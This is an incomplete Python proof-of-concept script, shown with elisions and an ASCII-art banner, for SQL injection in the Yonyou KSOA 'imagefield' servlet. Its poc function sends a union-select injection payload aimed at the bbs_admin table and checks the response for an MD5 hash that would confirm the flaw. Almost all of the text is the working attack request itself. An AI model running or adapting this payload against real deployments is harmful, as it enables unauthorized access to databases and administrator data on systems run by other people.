               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 用友时空KSOA imagefield接口SQL注入漏洞 poc
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target
    path = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%271%27))--+"
    url = target + path
    headers = {
    ...
    try:
        ...
        if  response1.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response1.text:
